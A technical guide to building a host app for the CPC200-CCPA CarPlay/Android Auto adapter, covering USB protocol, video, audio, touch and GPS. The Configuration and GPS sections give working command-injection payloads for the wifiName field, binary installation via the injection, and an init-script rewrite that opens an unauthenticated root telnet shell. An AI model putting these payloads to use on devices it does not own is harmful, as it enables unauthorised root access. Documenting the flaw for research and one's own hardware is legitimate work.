# Host Application Implementation Guide

**Purpose:** Guide for implementing a CarPlay/Android Auto host application
**Consolidated from:** GM_research implementation docs, carlink_native
**Last Updated:** 2026-02-17 (added direct USB 0x29 GPS method, GNSSCapability prerequisites, dual-path architecture)

---

## Critical: Host App Responsibility

**The adapter is a protocol tunnel. The host app owns all correctness.**

```
Phone ──▶ Adapter (tunnel) ──▶ Host App (policy) ──▶ Decoder ──▶ Display
              │                      │
              │                      └── YOU decide: drop, buffer, reset
              └── Just forwards data, makes no decisions
```

The adapter does NOT:
- Buffer or pace video
- Drop late frames
- Reset decoder on errors
- Compensate for jitter
- Enforce timing

**If video corrupts or latency grows, the problem is in your host app's policy.**

---

## Video: Projection Model (NOT Playback)

**CarPlay/Android Auto video is live UI projection, not video playback.**

Think of it like VNC or screen sharing: you're seeing the phone's screen in real-time. The user is touching, swiping, and interacting. They need immediate visual feedback.

### The Common Mistake

Treating projection video like a media file:
```
WRONG: Receive → Buffer → Decode in order → Render smoothly
RIGHT: Receive → Is it late? → Yes: DROP / No: Decode NOW → Render ASAP
```

### Projection Video Rules

| Rule | Rationale |
|------|-----------|
| Drop late frames (>30-40ms) | Late frames poison decoder reference state. Balance needed: too long causes corruption, too short drops valid frames |
| Keep buffers shallow (~150ms) | Deep buffers create input latency |
| Reset decoder on corruption | Decoders don't self-heal from reference errors |
| Accept frame drops as normal | Drops are harmless; latency is harmful |
| Don't enforce FPS targets | Stream is variable rate by design |
| Don't "catch up" via backlog | Playing old frames makes latency worse |

### What Happens If You Ignore This

| Wrong Policy | Symptom |
|--------------|---------|
| Deep buffering | Touch lag, UI feels unresponsive |
| Decoding late frames | Ghosting, smearing, visual trails |
| Not resetting on corruption | Artifacts persist and worsen |
| Enforcing fixed FPS | Stuttering, artificial pacing delays |
| Trying to "catch up" | Latency grows until unusable |

### Recommended Video Architecture

```
USB Read Thread
    │
    ▼
Jitter Buffer (shallow: 100-200ms max, ~10-12 packets)
    │
    ├── Frame arrives late? → DROP (unless IDR)
    │
    ├── Buffer full? → Skip to newest IDR
    │
    ▼
Decoder (feed immediately, don't wait)
    │
    ├── Corruption detected? → RESET + request keyframe
    │
    ▼
Render ASAP (don't pace to PTS)
```

---

## Overview

A host application communicates with the CPC200-CCPA adapter via USB to:
1. Initialize and maintain the connection
2. Process video frames (H.264 decoding)
3. Process audio streams (PCM routing)
4. Handle touch input
5. Manage configuration

---

## Connection Lifecycle

### 1. Adapter Discovery

```
1. Scan USB devices for:
   - VID: 0x1314
   - PID: 0x1521

2. Open USB interface (bulk transfer)

3. Claim interface and configure endpoints:
   - Endpoint OUT: Host → Adapter
   - Endpoint IN: Adapter → Host
```

### 2. Initialization Sequence (CRITICAL)

**IMPORTANT:** The adapter has a ~10-second watchdog timer from USB connection. Both init messages AND the first heartbeat must complete within this window.

```
1. USB Reset (clear partially configured state)

2. 3-second mandatory wait

3. Find adapter (2nd detection after reset)

4. Open USB connection

5. START HEARTBEAT TIMER (but do NOT send immediately!)
   - Start timer BEFORE sending init messages
   - Interval: 2 seconds
   - First heartbeat will fire at t=2000ms (AFTER init completes)
   - Do NOT send heartbeat at t=0

6. Send initialization messages (~1.5s total with 120ms delays):
   a. SendFile /tmp/screen_dpi
   b. Open (resolution, fps, format)
   c. SendFile /tmp/night_mode
   d. SendFile /tmp/hand_drive_mode
   e. BoxSettings (JSON configuration)
   f. Command messages as needed

7. Start reading loop

8. First heartbeat fires automatically at t=2000ms
```

**Timeline:**
```
t=0ms     → USB open, heartbeat timer started
t=0ms     → SendFile /tmp/screen_dpi
t=120ms   → Open message
...
t=~1500ms → Init complete
t=2000ms  → First heartbeat (timer fires)
t=4000ms  → Second heartbeat
```

### 3. Message Processing Loop

```
while (connected) {
    // Read message header (16 bytes)
    header = read(16)

    // Validate
    if (header.magic != 0x55AA55AA) continue
    if (header.type != ~header.type_check) continue

    // Read payload
    payload = read(header.length)

    // Dispatch by type
    switch (header.type) {
        case 0x02: handlePlugged(payload)
        case 0x03: handlePhase(payload)
        case 0x04: handleUnplugged()
        case 0x06: handleVideo(payload)
        case 0x07: handleAudio(payload)
        case 0x08: handleCommand(payload)
        case 0x19: handleBoxSettings(payload)
        case 0xCC: handleSoftwareVersion(payload)
        // ... other types
    }
}
```

### 4. Heartbeat Management

```
// Start heartbeat timer immediately after USB open
heartbeatTimer = setInterval(2000) {
    send(HeartBeat: 0xAA)
}

// On disconnect or error
heartbeatTimer.cancel()
```

---

## Video Processing

**IMPORTANT:** The adapter does NOT decode or transcode video. It forwards H.264 passthrough with USB headers prepended. Your host application MUST perform H.264 decoding.

**CRITICAL:** This is projection video (live UI), not media playback. See "Video: Projection Model" section above.

### Video Architecture (Binary Verified)

```
Phone (CarPlay/AA)  →  Adapter (Forward Only)  →  Host App (Decode + Policy)
     H.264 stream       Add 36-byte header          MediaCodec/FFmpeg
                        No buffering                Drop late frames
                        No policy                   Reset on corruption
```

The adapter:
- Receives H.264 via AirPlay/iAP2
- Parses NAL units for keyframe detection only
- Prepends USB header (16 bytes) + video metadata (20 bytes)
- Forwards unchanged H.264 payload to USB
- **Makes no timing or quality decisions**

### Receiving Video Frames (Projection Model)

```kotlin
if (msg_type == 0x06) {
    width = payload[0:4]
    height = payload[4:8]
    pts = payload[12:16]
    h264_data = payload[20:]  // Raw H.264 NAL units (Annex B format)

    // PROJECTION MODEL: Check staleness before decoding
    val frameAge = measureFrameAge(pts)  // Time since frame was sent

    if (frameAge > STALE_THRESHOLD_MS && !isIdrFrame(h264_data)) {
        // Late P-frame: DROP IT - decoding would poison references
        return
    }

    // IDR frames: Always decode (they reset reference state)
    // Current frames: Decode immediately
    decoder.decode(h264_data, pts)
}

// Recommended thresholds:
// STALE_THRESHOLD_MS = 30-40ms (based on jitter analysis: 85% of frames within ±40ms)
// Balance needed: too long causes decoder poisoning, too short drops valid frames
```

**Warning:** The PTS in the header is stream-relative (starts near 0 when session begins), NOT wall-clock time. To measure staleness, track arrival time separately or establish a PTS-to-wallclock offset on first frame.

### Keyframe Recovery

```
// On decode error
send(Frame: 0x0C)  // Request IDR

// Wait for response (100-200ms)
// Adapter sends: SPS + PPS + IDR
```

### Decoder Configuration

| Parameter | Recommended |
|-----------|-------------|
| Profile | High |
| Level | 4.1+ |
| Low Latency | Enabled |
| Output Format | YUV420 or RGB |

### Resolution/FPS Limits (Binary Verified)

**The adapter has no hardcoded resolution or FPS validation.** Limits are practical, not programmatic.

| Constraint | Limit | Failure Mode |
|------------|-------|--------------|
| USB 2.0 Bandwidth | ~35-40 MB/s (~280 Mbps) | Stream stutters/drops |
| Adapter RAM | ~128MB total | `Failed to allocate memory for video frame` |
| Buffer Size | Fixed (implementation-dependent) | `H264 data buffer overrun!` |

**Recommended Maximums:**

| Resolution | Max FPS | Bitrate | Notes |
|------------|---------|---------|-------|
| 1920x1080 | 60 | ~15-25 Mbps | Safe |
| 2400x960 | 60 | ~15-25 Mbps | Safe (ultra-wide) |
| 2560x1440 | 60 | ~25-35 Mbps | Marginal |
| 3840x2160 (4K) | 30 | ~25-40 Mbps | Marginal, may fail |
| 3840x2160 (4K) | 60 | ~50+ Mbps | **Will exceed USB bandwidth** |
| Any | 120 | 2x of 60fps | Requires halving resolution |

**Host apps should request only resolutions they can decode and that fit within USB 2.0 bandwidth.**

---

## Audio Processing

### Audio Stream Routing

```kotlin
// Create audio tracks based on audio_type
val mediaTrack = AudioTrack(USAGE_MEDIA, ...)
val navTrack = AudioTrack(USAGE_ASSISTANCE_NAVIGATION_GUIDANCE, ...)
val voiceTrack = AudioTrack(USAGE_ASSISTANT, ...)

fun handleAudio(payload) {
    val decodeType = payload[0:4]
    val volume = payload[4:8].toFloat()
    val audioType = payload[8:12]

    if (payload.size == 13) {
        // Command packet
        handleAudioCommand(payload[12])
    } else {
        // Data packet - route by audioType
        val pcm = payload[12:]
        when (audioType) {
            1 -> mediaTrack.write(pcm)
            2 -> navTrack.write(pcm)
            3 -> sendMicrophoneData(pcm)
        }
    }
}
```

### Audio Command Handling

```kotlin
fun handleAudioCommand(cmd: Byte) {
    when (cmd) {
        0x01 -> outputStart()
        0x02 -> outputStop()
        0x03 -> inputStart()   // Start mic capture
        0x04 -> inputStop()
        0x07 -> naviStart()    // Duck media
        0x10 -> naviComplete() // Restore media
        0x0A -> mediaStart()
        0x0B -> mediaStop()
        // ... etc
    }
}
```

### Volume Ducking

```kotlin
// When volume packet received (not 0.0)
if (volume > 0.0f && volume < 1.0f) {
    mediaTrack.setVolume(volume)  // Duck to 0.2
}
if (volume == 1.0f) {
    mediaTrack.setVolume(1.0f)    // Restore
}
```

### Microphone Capture

**IMPORTANT:** The firmware WebRTC processing only accepts **8000 Hz or 16000 Hz** sample rates (binary verified at `0x2dfa2`). Use the `decodeType` from the adapter's AudioData command message.

```kotlin
// Store the decodeType from adapter's audio command
var micDecodeType = 5  // Default to 16kHz, but use adapter's value

// When INPUT_START/PHONECALL_START received with audio command
fun handleAudioCommand(decodeType: Int, cmd: Byte) {
    when (cmd) {
        0x04 -> {  // PHONECALL_START
            micDecodeType = decodeType  // Use adapter's requested format
            startMicCapture(sampleRate = if (decodeType == 3) 8000 else 16000)
        }
        0x08 -> {  // SIRI_START
            micDecodeType = decodeType  // Usually 5 (16kHz)
            startMicCapture(sampleRate = 16000)
        }
    }
}

fun startMicCapture(sampleRate: Int) {
    // Configure recorder with the requested sample rate
    micRecorder = AudioRecord(..., sampleRate, ...)
    micRecorder.startRecording()
    micTimer = setInterval(256ms) {
        val data = micRecorder.read(8192)
        send(AudioData: decodeType=micDecodeType, audioType=3, data)
    }
}
```

**Supported Sample Rates (WebRTC AECM validated):**
- `decodeType=3` → 8000 Hz (narrowband)
- `decodeType=5` → 16000 Hz (wideband)
- Other sample rates will cause WebRTC initialization failure on the adapter

---

## Touch Input

### Sending Touch Events

```kotlin
fun sendTouch(action: Int, x: Float, y: Float) {
    val payload = ByteBuffer.allocate(16)
        .putInt(action)      // 0=Down, 1=Move, 2=Up
        .putFloat(x / screenWidth)   // Normalized 0.0-1.0
        .putFloat(y / screenHeight)  // Normalized 0.0-1.0
        .putInt(0)           // Flags

    send(Touch: 0x05, payload)
}

// For multi-touch (0x17)
fun sendMultiTouch(points: List<TouchPoint>) {
    val payload = ByteBuffer.allocate(4 + points.size * 16)
        .putInt(points.size)

    for (point in points) {
        payload.putInt(point.action)
        payload.putFloat(point.x)
        payload.putFloat(point.y)
        payload.putInt(point.id)
    }

    send(MultiTouch: 0x17, payload)
}
```

---

## Configuration

### BoxSettings JSON (Binary Verified Jan 2026)

**⚠️ SECURITY NOTE:** The `wifiName`, `btName`, and `oemIconLabel` fields are passed to shell commands via `popen()` without sanitization. This enables command injection - any shell command can be executed as root by including shell metacharacters in these fields. See `03_Security_Analysis/vulnerabilities.md` for details.

**Command Execution Example (Live Tested Jan 2026):**
```kotlin
// This executes riddleBoxCfg immediately on the adapter:
put("wifiName", "a\"; /usr/sbin/riddleBoxCfg -s AdvancedFeatures 1; /usr/sbin/riddleBoxCfg --upConfig; echo \"")
```

**Important Notes:**
- Injection breaks the sed command, so WiFi SSID is NOT updated
- **Workaround:** Send BoxSettings twice - first with injection, second with normal values
- Use `busybox <applet>` for commands without symlinks (e.g., `busybox chpasswd` not `chpasswd`)

```kotlin
// Send BoxSettings twice to inject AND set proper WiFi name:
fun sendInitWithInjection() {
    val injection = "a\"; /usr/sbin/riddleBoxCfg -s AdvancedFeatures 1; /usr/sbin/riddleBoxCfg --upConfig; echo \""

    // First: Execute injection
    val injectionSettings = JSONObject().apply {
        put("wifiName", injection)
        put("btName", "carlink")
        // ... other fields
    }
    send(BoxSettings: 0x19, injectionSettings.toString().toByteArray())

    // Second: Set proper WiFi name
    val normalSettings = JSONObject().apply {
        put("wifiName", "MyCarPlay")  // Actual desired name
        put("btName", "MyCarPlay")
        // ... other fields
    }
    send(BoxSettings: 0x19, normalSettings.toString().toByteArray())
}
```

See `02_Protocol_Reference/usb_protocol.md` for complete BoxSettings field documentation.

```kotlin
fun sendBoxSettings() {
    val settings = JSONObject().apply {
        // Core configuration
        put("mediaDelay", 300)
        put("syncTime", System.currentTimeMillis() / 1000)
        put("autoConn", true)
        put("autoPlay", false)
        put("bgMode", 0)
        put("startDelay", 0)

        // Display settings
        put("androidAutoSizeW", displayWidth)
        put("androidAutoSizeH", displayHeight)
        put("screenPhysicalW", 250)   // Physical width in mm
        put("screenPhysicalH", 100)   // Physical height in mm
        put("drivePosition", 0)       // 0=LHD, 1=RHD

        // Audio settings
        put("mediaSound", 1)          // 0=44.1kHz, 1=48kHz
        put("callQuality", 1)
        put("echoDelay", 320)
        put("mediaVol", 1.0)
        put("navVol", 1.0)
        put("callVol", 1.0)

        // Network (⚠️ wifiName/btName vulnerable to command injection)
        put("WiFiChannel", 36)
        put("wifiName", "carlink")    // ⚠️ CMD INJECTION RISK
        put("btName", "carlink")      // ⚠️ CMD INJECTION RISK
        put("boxName", "carlink")

        // For iOS 13+ navigation video — sending naviScreenInfo is all that's needed
        // (AdvancedFeatures=1 is NOT required when naviScreenInfo is provided)
        put("naviScreenInfo", JSONObject().apply {
            put("width", 480)
            put("height", 272)
            put("fps", 30)
        })
    }

    send(BoxSettings: 0x19, settings.toString().toByteArray())
}
```

### Open Message

```kotlin
fun sendOpen() {
    val payload = ByteBuffer.allocate(28)
        .putInt(displayWidth)    // e.g., 2400
        .putInt(displayHeight)   // e.g., 960
        .putInt(fps)             // e.g., 60
        .putInt(5)               // format=5 for full H.264
        .putInt(49152)           // packetMax
        .putInt(2)               // boxVersion
        .putInt(2)               // phoneMode

    send(Open: 0x01, payload)
}
```

### Android Auto Mode (CRITICAL)

**For Android Auto support**, you MUST send the `android_work_mode` file on every connection:

```kotlin
fun enableAndroidAutoMode() {
    // Send file: /etc/android_work_mode with value 1
    val path = "/etc/android_work_mode"
    val content = ByteBuffer.allocate(4).putInt(1).array()

    val payload = ByteBuffer.allocate(4 + path.length + 1 + 4 + content.size)
        .putInt(path.length)
        .put(path.toByteArray())
        .put(0)  // null terminator
        .putInt(content.size)
        .put(content)

    send(SendFile: 0x99, payload)
}
```

**CRITICAL:** This must be sent on EVERY connection, not just the first time:
- Firmware resets `AndroidWorkMode` to 0 when phone disconnects
- Without this, Android Auto pairing will fail even if Bluetooth pairs successfully
- Firmware logs: `OnAndroidWorkModeChanged: 0 → 1` followed by `Start Link Deamon: AndroidAuto`

### Advanced File Operations (SendFile 0x99)

**⚠️ SECURITY WARNING:** SendFile has **no path validation or sanitization**:
- Any writable path is accessible (root filesystem is mounted read-write)
- No path traversal (`../`) filtering
- No whitelist enforcement
- If your host application is compromised, an attacker could overwrite system files

**Secure Implementation Note:** If accepting user-provided paths, validate them thoroughly before passing to SendFile.

#### Writable Paths (Live Verified Jan 2026)

| Path | Writable | Persistence | Notes |
|------|----------|-------------|-------|
| `/tmp/*` | ✅ Yes | RAM (lost on reboot) | ~52 MB free |
| `/etc/*` | ✅ Yes | Flash (persistent) | Config files, init scripts |
| `/script/*` | ✅ Yes | Flash (persistent) | Startup scripts |
| `/usr/sbin/*` | ✅ Yes | Flash (persistent) | System binaries |

#### Binary Upload Example

```kotlin
// Upload ARM binary to adapter
fun uploadBinary(binaryPath: String, destinationPath: String) {
    val binaryData = File(binaryPath).readBytes()

    // Step 1: Send to /tmp (always safe)
    sendFile("/tmp/uploaded_binary", binaryData)

    // Step 2: Use injection to install and make executable
    val installCmd = "a\"; mv /tmp/uploaded_binary $destinationPath; chmod +x $destinationPath; echo \""
    sendBoxSettingsWithInjection(installCmd)
}

// Example: Upload custom tool
uploadBinary("/path/to/armv7l_tool", "/usr/sbin/mytool")
```

**Note:** Binaries must be cross-compiled for **armv7l** (ARM 32-bit).

#### Modify Init Scripts

```kotlin
// Option 1: Use sed via injection (surgical change)
val enableDropbear = "a\"; sed -i 's/#dropbear/dropbear/' /etc/init.d/rcS; echo \""

// Option 2: Replace entire file via SendFile
val newRcS = """
#!/bin/sh
. /etc/profile
dropbear
telnetd -l /bin/sh -p 23 &
mount -a
# ... rest of script
""".trimIndent()
sendFile("/etc/init.d/rcS", newRcS.toByteArray())
```

#### Auto-Extraction (hwfs.tar.gz)

Files sent to `/tmp/hwfs.tar.gz` are automatically extracted:

```kotlin
// Firmware executes: tar -xvf /tmp/hwfs.tar.gz -C /tmp
sendFile("/tmp/hwfs.tar.gz", createTarGz(files))
```

See `03_Security_Analysis/vulnerabilities.md` for complete security implications.

### Navigation Video Setup (iOS 13+)

Include `naviScreenInfo` in BoxSettings to activate navigation video (type 0x2C). `AdvancedFeatures=1` is NOT required when `naviScreenInfo` is provided. See `02_Protocol_Reference/video_protocol.md` for complete firmware analysis of the navigation video activation path.

**Note:** Only include `naviScreenInfo` when your host app handles NaviVideoData (Type 0x2C). This causes a second H.264 video stream that increases USB bandwidth and processing load.

1. **Optionally handle Command 508**:
   ```kotlin
   // When receiving Command 508 from adapter — echo it back (recommended precaution)
   // Testing was INCONCLUSIVE on whether this is strictly required.
   // The pi-carplay reference implementation does echo 508 back.
   if (commandId == 508) {
       send(Command: 0x08, payload = 508)
   }
   ```

2. **Handle NaviVideoData (Type 0x2C)**:
   ```kotlin
   // Navigation video uses SAME header structure as main video (20-byte header)
   if (msg_type == 0x2C) {
       width = payload[0:4]      // e.g., 1200
       height = payload[4:8]     // e.g., 500
       unknown1 = payload[8:12]  // Always 1 (purpose unknown, NOT frame type)
       pts = payload[12:16]      // Presentation timestamp
       flags = payload[16:20]    // Usually 0
       h264_data = payload[20:]

       // Frame type determined by NAL unit type in H.264 data, not header field
       naviDecoder.decode(h264_data, pts)
   }
   ```

---

## Error Handling

### Connection Errors

| Error | Recovery |
|-------|----------|
| USB disconnect | Stop heartbeat, close interface, retry |
| Unplugged (0x04) | Full restart sequence (phone disconnected) |
| Phase stuck at 7 | Wait or timeout and retry |
| No heartbeat response | Reset USB and restart |

**⚠️ CRITICAL (Binary Verified Feb 2026):** Do NOT treat Command 1010 (DeviceWifiNotConnected) as a disconnect signal. This is a WiFi hotspot status notification only - it means no phone is connected to the adapter's WiFi. For USB CarPlay sessions, this message is irrelevant since all video/audio flows over USB, not WiFi. The correct session termination signals are:
- `Unplugged` (0x04) - Phone disconnected from adapter
- `Phase` (0x03) with value 0 - Session ended
- Heartbeat timeout - Communication lost

### Video Errors

| Error | Recovery |
|-------|----------|
| Decode failure | Send Frame (0x0C) for IDR |
| No video data | Check Phase is 8 |
| Resolution mismatch | Re-send Open message |

### Video Corruption (Projection-Specific)

| Symptom | Cause | Recovery |
|---------|-------|----------|
| Ghosting/smearing | Decoder reference poisoning | Reset decoder + request IDR |
| Progressive degradation | Late frames being decoded | Tighten staleness threshold |
| Corruption persists after IDR | Decoder state fully poisoned | Full decoder recreation |
| Latency grows over time | Buffer accumulation | Drop more aggressively |
| Artifacts "stick" to motion | Reference contamination | Immediate reset |

**Key Rule:** If corruption survives one IDR frame, the decoder state is poisoned. Reset immediately — don't wait for it to heal.

**Decoder Reset Strategy (Platform-Specific):**
- Most decoders: `flush()` + wait for next IDR
- Intel VPU (OMX.Intel.hw_vd.h264): Requires full codec recreation (flush is insufficient)

### Audio Errors

| Error | Recovery |
|-------|----------|
| No audio | Check audioType routing |
| Distortion | Verify sample rate matches decodeType |
| Echo | Adjust EchoLatency in config |
| WebRTC init fail | Use only 8kHz or 16kHz for mic (firmware limitation) |
| Mic not working | Check decodeType from adapter's AudioData command |

---

## Platform-Specific Notes

### Android (AAOS)

- Use `AudioTrack` with appropriate `AudioAttributes`
- Map audio_type to Android audio buses
- Handle `AUDIOFOCUS_*` events

### Linux (Pi, Embedded)

- Use ALSA/PulseAudio for audio output
- Use V4L2 or GStreamer for video decode
- Manage USB via libusb

### iOS (Unlikely use case)

- Would require MFi program access
- USB communication via ExternalAccessory framework

---

## GPS/GNSS Data (Binary Verified Feb 2026)

**Finding:** The CPC200-CCPA has a **fully implemented GPS forwarding pipeline**. GPS data from the Android head unit is relayed to the iPhone for CarPlay use via the iAP2 LocationInformation protocol. The pipeline involves ARMadb-driver (USB reception/validation), ARMiPhoneIAP2 (`CiAP2LocationEngine` — NMEA→iAP2 conversion), and delivery to the iPhone.

If your head unit has GPS hardware, you can forward location data to the phone for CarPlay navigation. This allows CarPlay Maps to use the vehicle's GPS instead of the phone's.

### Prerequisites

1. **Enable GPS capability on adapter** (one-time, requires SSH or command injection):
   ```bash
   # Via SSH:
   ssh root@192.168.43.1
   /usr/sbin/riddleBoxCfg -s GNSSCapability 3    # Enable GPGGA (bit 0) + GPRMC (bit 1)
   rm -f /etc/RiddleBoxData/AIEIPIEREngines.datastore
   busybox reboot
   ```

   ```kotlin
   // Or via command injection (one-time):
   // wifiName = "a\"; /usr/sbin/riddleBoxCfg -s GNSSCapability 3; rm -f /etc/RiddleBoxData/AIEIPIEREngines.datastore; echo \""
   ```

   **⚠️ CRITICAL:** `GNSSCapability` defaults to `0`. When `GNSSCapability=0`, the GPS pipeline is blocked at **two** points: iAP2 identification (`CiAP2IdentifyEngine.virtual_8` at `0x240e4`) and session init (`fcn.00015ee4` at `0x15fa4`). The iPhone never learns the adapter can provide location data, so it never sends `StartLocationInformation`.

   **GNSSCapability bitmask:** bit 0=GPGGA(1), bit 1=GPRMC(2), bit 3=PASCD(8). Use value `3` for GPGGA+GPRMC. `HudGPSSwitch` defaults to `1` (already correct). `DashboardInfo` does NOT need to be changed for GPS — it controls vehicleInfo/vehicleStatus/routeGuidance, not location.

2. **Send StartGNSSReport command** when CarPlay session starts:
   ```kotlin
   send(Command: 0x08, payload = 18)  // StartGNSSReport
   ```

### Sending GPS Data — Two Methods

The adapter supports two paths for receiving GPS data. Both converge at `CiAP2LocationEngine` in ARMiPhoneIAP2 for iAP2 delivery to the phone.

#### Method 1: Direct USB Message Type 0x29 (Recommended)

Send GPS data directly as USB message type 0x29 (`GNSS_DATA`). This is the lower-latency path.

```kotlin
fun sendGnssData(nmeaSentences: String) {
    val nmeaBytes = nmeaSentences.toByteArray(Charsets.US_ASCII)
    val payload = ByteBuffer.allocate(4 + nmeaBytes.size)
        .order(ByteOrder.LITTLE_ENDIAN)
        .putInt(nmeaBytes.size)       // 4-byte NMEA data length
        .put(nmeaBytes)               // NMEA sentence data
    send(GnssData: 0x29, payload.array())
}

// Usage at ~1 Hz:
fun onLocationUpdate(location: Location) {
    val nmea = formatNmea(location)  // See NMEA formatting below
    sendGnssData(nmea)
}
```

#### Method 2: SendFile to /tmp/gnss_info (Fallback)

Write GPS data via SendFile (0x99) to `/tmp/gnss_info` in standard **NMEA 0183** format. Higher latency due to file I/O.

```kotlin
fun sendGpsData(lat: Double, lon: Double, alt: Double, speed: Float, heading: Float) {
    // Format NMEA sentences
    val time = SimpleDateFormat("HHmmss.SS", Locale.US).format(Date())
    val date = SimpleDateFormat("ddMMyy", Locale.US).format(Date())

    // Convert decimal degrees to NMEA format (DDDMM.MMMM)
    val latDeg = Math.abs(lat).toInt()
    val latMin = (Math.abs(lat) - latDeg) * 60
    val latDir = if (lat >= 0) "N" else "S"

    val lonDeg = Math.abs(lon).toInt()
    val lonMin = (Math.abs(lon) - lonDeg) * 60
    val lonDir = if (lon >= 0) "E" else "W"

    // $GPGGA - Position fix
    val gpgga = String.format(
        "\$GPGGA,%s,%02d%07.4f,%s,%03d%07.4f,%s,1,08,0.9,%.1f,M,0.0,M,,",
        time, latDeg, latMin, latDir, lonDeg, lonMin, lonDir, alt
    )

    // $GPRMC - Recommended minimum
    val gprmc = String.format(
        "\$GPRMC,%s,A,%02d%07.4f,%s,%03d%07.4f,%s,%.1f,%.1f,%s,,,A",
        time, latDeg, latMin, latDir, lonDeg, lonMin, lonDir,
        speed * 1.94384, // m/s to knots
        heading, date
    )

    // Add checksums
    val gpggaWithChecksum = addNmeaChecksum(gpgga)
    val gprmcWithChecksum = addNmeaChecksum(gprmc)

    // Combine and send
    val nmeaData = "$gpggaWithChecksum\r\n$gprmcWithChecksum\r\n"
    sendFile("/tmp/gnss_info", nmeaData.toByteArray())
}

fun addNmeaChecksum(sentence: String): String {
    var checksum = 0
    for (c in sentence.substring(1)) {  // Skip leading $
        checksum = checksum xor c.code
    }
    return "$sentence*${String.format("%02X", checksum)}"
}
```

### NMEA Sentence Reference

| Sentence | Purpose | Required Fields |
|----------|---------|-----------------|
| `$GPGGA` | Position fix | Time, lat, lon, fix quality, satellites, altitude |
| `$GPRMC` | Recommended minimum | Time, status, lat, lon, speed (knots), course, date |
| `$GPGSV` | Satellites in view | Number of satellites, satellite info (optional) |

### Additional Vehicle Data

The adapter also supports vehicle sensor data via separate files:

| Data Type | File Path | Format |
|-----------|-----------|--------|
| Vehicle Speed | `/tmp/vehicle_speed` | Float (m/s) |
| Vehicle Heading | `/tmp/vehicle_heading` | Float (degrees, 0-360) |
| Reverse Gear | `/tmp/reverse_gear` | 0 or 1 |

```kotlin
// Send vehicle speed (for dead reckoning)
fun sendVehicleSpeed(speedMs: Float) {
    val data = ByteBuffer.allocate(4).putFloat(speedMs).array()
    sendFile("/tmp/vehicle_speed", data)
}

// Send heading from vehicle compass
fun sendVehicleHeading(degrees: Float) {
    val data = ByteBuffer.allocate(4).putFloat(degrees).array()
    sendFile("/tmp/vehicle_heading", data)
}
```

### GPS Data Flow and iPhone Fusion Behavior

The iPhone does NOT blindly use vehicle GPS -- it applies a **best-accuracy-wins fusion model** via CoreLocation's `CL-fusion` engine. Vehicle GPS is most valuable when the iPhone's own GPS is degraded (phone in pocket/bag, metal console, tunnels) or during cold start. See `02_Protocol_Reference/usb_protocol.md` > GnssData (0x29) for the complete iPhone GPS fusion analysis, including the end-to-end data flow, observed iPhone syslog behavior, and when vehicle GPS wins.

#### Debugging iPhone GPS Usage

To check if the iPhone is receiving and processing vehicle GPS:

```bash
# Install libimobiledevice (macOS)
brew install libimobiledevice

# Stream iPhone syslog filtered for location/GPS
idevicesyslog -m "Location\|fusion\|NMEA\|accessory\|LocationInformation"

# Key indicators:
# ✅ "sending nmea sentence to location client" — accessoryd forwarding NMEA
# ✅ "EAAccessoryDidReceiveNMEASentenceNotification" — locationd received it
# ✅ "numHypothesis,2" — vehicle GPS is a competing position source (good!)
# ⚠️ "numHypothesis,1" + "isPassthrough,1" — phone GPS winning, vehicle GPS is metadata only
# ❌ No "nmea sentence" logs — NMEA not reaching iPhone (check GNSSCapability)
```

### Stopping GPS Reports

When CarPlay session ends:
```kotlin
send(Command: 0x08, payload = 19)  // StopGNSSReport
```

---

## Charge Mode Control (Binary Verified Jan 2026)

The adapter can control USB charging speed for connected phones.

### Setting Charge Mode

```kotlin
// Enable fast charging
fun enableFastCharge() {
    sendFile("/tmp/charge_mode", byteArrayOf(1))
}

// Use slow charging (default)
fun enableSlowCharge() {
    sendFile("/tmp/charge_mode", byteArrayOf(0))
}
```

See `02_Protocol_Reference/usb_protocol.md` > SendFile for GPIO charge mode behavior table.

---

## Testing Checklist

| Test | Expected Result |
|------|-----------------|
| Cold start (app restart) | Stable connection in <10s |
| Reconnect (adapter replug) | Auto-reconnect works |
| Media playback | Smooth video, synced audio |
| Navigation prompts | Media ducks, nav audible |
| Siri activation | Bidirectional audio works |
| Phone call | Voice clear both directions |
| Touch input | Responsive, accurate |

---

## References

- Source: `GM_research/cpc200_research/docs/implementation/`
- Source: `carlink_native/documents/reference/Firmware/`
- Protocol reference: See `02_Protocol_Reference/` in this documentation
- **Session examples: See `session_examples.md` for real captured CarPlay/Android Auto packet sequences**
